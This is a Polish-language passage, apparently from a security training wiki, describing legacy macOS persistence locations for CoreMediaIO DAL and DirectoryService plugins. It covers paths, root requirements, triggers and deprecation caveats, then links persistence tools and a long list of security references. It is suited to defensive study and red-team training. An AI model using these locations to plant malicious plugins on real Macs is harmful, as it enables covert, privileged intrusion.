### Wtyczki CoreMediaIO DAL

Opis: [https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/](https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/)<sup>[[53]](#references)</sup>\
Minimalny przykład: [https://github.com/johnboiles/coremediaio-dal-minimal-example](https://github.com/johnboiles/coremediaio-dal-minimal-example)<sup>[[54]](#references)</sup>

- **Mechanizm starszego typu:** Przestarzały od macOS 12.3. macOS 14.1 i nowsze domyślnie wyłączają starsze wtyczki wideo. Aby ta ścieżka zadziałała, użytkownik musi przywrócić obsługę starszych wtyczek wideo z poziomu Recovery; sam zapisywalny katalog nie wystarczy. [Aktualne wskazówki Apple dotyczące pomocy technicznej](https://support.apple.com/en-us/108387).
- Do zapisu w katalogu wtyczek wymagane są uprawnienia root. Wykonanie kodu zależy od zgodnego klienta, który nadal ładuje wtyczki DAL; nie testowano tego podczas działania w macOS 26.

#### Lokalizacja

- **`/Library/CoreMediaIO/Plug-Ins/DAL/*.plugin`**
  - Wymagane uprawnienia root
  - **Wyzwalacz:** Zgodny klient kamery wylicza urządzenia **po przywróceniu obsługi starszych wtyczek**. Weryfikacja bibliotek przez klienta może zablokować wtyczkę innej firmy.

#### Opis i wykorzystanie

Wtyczki **DAL** (Device Abstraction Layer) CoreMediaIO były ładowane w procesie przez niektóre aplikacje obsługujące kamery. W prezentacji Apple poświęconej [rozszerzeniom kamery](https://developer.apple.com/videos/play/wwdc2022/10022/) wyraźnie stwierdzono, że starsze wtyczki DAL **nie działały** z FaceTime, QuickTime Player ani Photo Booth, a wiele innych klientów stosuje weryfikację bibliotek. Nowoczesne [rozszerzenia Core Media I/O](https://developer.apple.com/documentation/coremediaio) działają poza procesem i mają osobny model instalacji oraz zatwierdzania. Historyczna technika wykorzystująca wtyczki działające w procesie nie oznacza ogólnego obejścia Camera TCC w obecnych wersjach macOS.<sup>[[53]](#references)[[54]](#references)</sup>

Obserwacja tylko do odczytu w macOS 26: `/Library/CoreMediaIO/Plug-Ins/DAL` istnieje i jest własnością root. Nie zweryfikowano ani obsługi starszych wtyczek, ani ładowania ich przez jakiegokolwiek klienta.

### Wtyczki Directory Service

Opis: [https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/](https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/)<sup>[[53]](#references)</sup>

- **Starszy mechanizm warunkowy:** Instalacja wymaga uprawnień root, a wtyczka musi być faktycznie skonfigurowana i załadowana. API wtyczek DirectoryService jest przestarzałe; przed uznaniem tego za wyzwalacz podczas uruchamiania sprawdź konfigurację Open Directory na docelowym Macu.

#### Lokalizacja

- **`/Library/DirectoryServices/PlugIns/*.dsplug`**
  - Wymagane uprawnienia root
  - **Wyzwalacz:** `dspluginhelperd` ładuje kwalifikującą się, skonfigurowaną wtyczkę, gdy wymaga jej Open Directory. [Przewodnik Apple dotyczący środowiska uruchomieniowego wtyczek](https://developer.apple.com/library/archive/documentation/Networking/Conceptual/Open_Dir_Plugin/RuntimeEnviornment/RuntimeEnviornment.html) informuje, że wtyczki nieskonfigurowane do uruchamiania mogą być ładowane na żądanie po otwarciu ich węzła.

#### Opis i wykorzystanie

`dspluginhelperd` obsługuje starsze pakiety wtyczek DirectoryService. Złośliwa wtyczka może zapewniać ścieżkę wykonania z podwyższonymi uprawnieniami, jeśli zostanie zaakceptowana i aktywowana jako starsza wtyczka; jest to mechanizm odrębny od PAM i Authorization Plugins. Samo istnienie katalogu nie dowodzi, że nowo zapisana wtyczka zostanie uruchomiona przy następnym rozruchu. Lokalne podręczniki Apple `dspluginhelperd(8)` i `opendirectoryd(8)` w macOS 26.5 nadal wymieniają ten proces pomocniczy i starszą ścieżkę.<sup>[[53]](#references)</sup>

Obserwacja tylko do odczytu w macOS 26: `/Library/DirectoryServices/PlugIns` i `/usr/libexec/dspluginhelperd` istnieją. Podczas tego testu nie zainstalowano, nie skonfigurowano ani nie załadowano żadnej wtyczki.

## Techniki i narzędzia persistence

- [https://github.com/cedowens/Persistent-Swift](https://github.com/cedowens/Persistent-Swift)
- [https://github.com/D00MFist/PersistentJXA](https://github.com/D00MFist/PersistentJXA)

## References

- [1] [2025 — rok Infostealerów](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [2] [Poza dobrymi, starymi LaunchAgents — 1 — pliki startowe powłoki](https://theevilbit.github.io/beyond/beyond_0001/)
- [3] [Poza dobrymi, starymi LaunchAgents — 18 — X11 i XQuartz](https://theevilbit.github.io/beyond/beyond_0018/)
- [4] [Poza dobrymi, starymi LaunchAgents — 21 — ponownie otwierane aplikacje](https://theevilbit.github.io/beyond/beyond_0021/)
- [5] [Poza dobrymi, starymi LaunchAgents — 20 — preferencje Terminala](https://theevilbit.github.io/beyond/beyond_0020/)
- [6] [Poza dobrymi, starymi LaunchAgents — 13 — wtyczki audio](https://theevilbit.github.io/beyond/beyond_0013/)
- [7] [Wtyczki Audio Unit (SpecterOps)](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)
- [8] [Poza dobrymi, starymi LaunchAgents — 12 — wtyczki QuickLook](https://theevilbit.github.io/beyond/beyond_0012/)
- [9] [Poza dobrymi, starymi LaunchAgents — 22 — LoginHook i LogoutHook](https://theevilbit.github.io/beyond/beyond_0022/)
- [10] [Poza dobrymi, starymi LaunchAgents — 4 — zadania cron](https://theevilbit.github.io/beyond/beyond_0004/)
- [11] [Poza dobrymi, starymi LaunchAgents — 2 — uruchamianie iTerm2](https://theevilbit.github.io/beyond/beyond_0002/)
- [12] [Poza dobrymi, starymi LaunchAgents — 7 — wtyczki xbar](https://theevilbit.github.io/beyond/beyond_0007/)
- [13] [Poza dobrymi, starymi LaunchAgents — 8 — Hammerspoon](https://theevilbit.github.io/beyond/beyond_0008/)
- [14] [Poza dobrymi, starymi LaunchAgents — 6 — SSHRC](https://theevilbit.github.io/beyond/beyond_0006/)
- [15] [Poza dobrymi, starymi LaunchAgents — 3 — elementy logowania](https://theevilbit.github.io/beyond/beyond_0003/)
- [16] [Poza dobrymi, starymi LaunchAgents — 14 — atrun](https://theevilbit.github.io/beyond/beyond_0014/)
- [17] [Poza dobrymi, starymi LaunchAgents — 24 — działania folderów](https://theevilbit.github.io/beyond/beyond_0024/)
- [18] [Działania folderów jako mechanizm persistence w macOS (SpecterOps)](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)
- [19] [Poza dobrymi, starymi LaunchAgents — 27 — skróty Docka](https://theevilbit.github.io/beyond/beyond_0027/)
- [20] [Poza dobrymi, starymi LaunchAgents — 17 — selektory kolorów](https://theevilbit.github.io/beyond/beyond_0017/)
- [21] [Poza dobrymi, starymi LaunchAgents — 26 — wtyczki Finder Sync](https://theevilbit.github.io/beyond/beyond_0026/)
- [22] [Analiza mechanizmu persistence „Mac File Opener” (Objective-See)](https://objective-see.org/blog/blog_0x11.html)
- [23] [Poza dobrymi, starymi LaunchAgents — 16 — wygaszacz ekranu](https://theevilbit.github.io/beyond/beyond_0016/)
- [24] [Zachowanie dostępu: wygaszacze ekranu jako mechanizm persistence w macOS (SpecterOps)](https://posts.specterops.io/saving-your-access-d562bf5bf90b)
- [25] [Poza dobrymi, starymi LaunchAgents — 11 — importery Spotlight](https://theevilbit.github.io/beyond/beyond_0011/)
- [26] [Poza dobrymi, starymi LaunchAgents — 9 — panel preferencji](https://theevilbit.github.io/beyond/beyond_0009/)
- [27] [Poza dobrymi, starymi LaunchAgents — 19 — skrypty okresowe](https://theevilbit.github.io/beyond/beyond_0019/)
- [28] [Poza dobrymi, starymi LaunchAgents — 5 — moduły uwierzytelniania dołączane dynamicznie (PAM)](https://theevilbit.github.io/beyond/beyond_0005/)
- [29] [Poza dobrymi, starymi LaunchAgents — 28 — wtyczki Authorization](https://theevilbit.github.io/beyond/beyond_0028/)
- [30] [Trwała kradzież poświadczeń za pomocą wtyczek Authorization (SpecterOps)](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)
- [31] [Poza dobrymi, starymi LaunchAgents — 30 — plik konfiguracyjny man — man.conf](https://theevilbit.github.io/beyond/beyond_0030/)
- [32] [Poza dobrymi, starymi LaunchAgents — 25 — moduły Apache2](https://theevilbit.github.io/beyond/beyond_0025/)
- [33] [Poza dobrymi, starymi LaunchAgents — 31 — framework audytu BSM](https://theevilbit.github.io/beyond/beyond_0031/)
- [34] [Poza dobrymi, starymi LaunchAgents — 23 — emond, demon monitorujący zdarzenia](https://theevilbit.github.io/beyond/beyond_0023/)
- [35] [Poza dobrymi, starymi LaunchAgents — 29 — amstoold](https://theevilbit.github.io/beyond/beyond_0029/)
- [36] [Poza dobrymi, starymi LaunchAgents — 15 — xsanctl](https://theevilbit.github.io/beyond/beyond_0015/)
- [37] [Poza dobrymi, starymi LaunchAgents — 10 — pliki skryptów aplikacji](https://theevilbit.github.io/beyond/beyond_0010/)
- [38] [Poza dobrymi, starymi LaunchAgents — 32 — wtyczki Dock Tile](https://theevilbit.github.io/beyond/beyond_0032/)
- [39] [Poza dobrymi, starymi LaunchAgents — 33 — widżety](https://theevilbit.github.io/beyond/beyond_0033/)
- [40] [Poza dobrymi, starymi LaunchAgents — 34 — zadania rozruchowe launchd](https://theevilbit.github.io/beyond/beyond_0034/)
- [41] [Poza dobrymi, starymi LaunchAgents — 35 — persistence przez NVRAM (apple-trusted-trampoline)](https://theevilbit.github.io/beyond/beyond_0035/)
- [42] [Wykorzystanie poczty e-mail do persistence w OS X (n00py)](https://www.n00py.io/2016/10/using-email-for-persistence-on-os-x/)
- [43] [Podejrzana modyfikacja plist reguł Apple Mail (Elastic)](https://www.elastic.co/guide/en/security/current/suspicious-apple-mail-rule-plist-modification.html)
- [44] [Złośliwe profile — jedno z najpoważniejszych zagrożeń dla Maców (Jamf)](https://www.jamf.com/blog/malicious-profiles-come/)
- [45] [The Art of Mac Malware, tom 1 — rozdz. 0x2: Persistence (dyld)](https://taomm.org/PDFs/vol1/CH%200x02%20Persistence.pdf)
- [46] [Analiza CVE-2024-44243 — obejście SIP w macOS za pomocą rozszerzeń jądra (Microsoft)](https://www.microsoft.com/en-us/security/blog/2025/01/13/analyzing-cve-2024-44243-a-macos-system-integrity-protection-bypass-through-kernel-extensions/)
- [47] [RCE i eksfiltracja tokenów API przez pliki projektu Claude Code (CVE-2025-59536, Check Point)](https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files-cve-2025-59536/)
- [48] [Nowa podatność w GitHub Copilot i Cursor — backdoor w pliku Rules (Pillar Security)](https://www.pillar.security/blog/new-vulnerability-in-github-copilot-and-cursor-how-hackers-can-weaponize-code-agents)
- [49] [Chrome — alternatywne metody instalacji (rozszerzenia zewnętrzne)](https://developer.chrome.com/docs/extensions/how-to/distribute/install-extensions)
- [50] [Usuwanie ExtensionInstallForcelist w Chrome na Macu (macsecurity.net)](https://macsecurity.net/view/492-extensioninstallforcelist-chrome-policy-mac)
- [51] [Pisanie wtyczek Sudo (sigma-star)](https://blog.sigma-star.io/2025/07/on-writing-sudo-plugins/)
- [52] [Zdalne wykorzystanie Maca za pomocą niestandardowych schematów URL (Objective-See)](https://objective-see.org/blog/blog_0x38.html)
- [53] [Dwie techniki persistence w macOS wykorzystujące wtyczki (codecolorist)](https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/)
- [54] [Minimalny przykład CoreMediaIO DAL (johnboiles)](https://github.com/johnboiles/coremediaio-dal-minimal-example)
- [55] [Sploitlight: analiza podatności macOS TCC opartej na Spotlight (Microsoft)](https://www.microsoft.com/en-us/security/blog/2025/07/28/sploitlight-analyzing-a-spotlight-based-macos-tcc-vulnerability/)
- [56] [Dokumentacja modułu Python `site` (.pth / usercustomize / sitecustomize)](https://docs.python.org/3/library/site.html)
{{#include ../banners/hacktricks-training.md}}
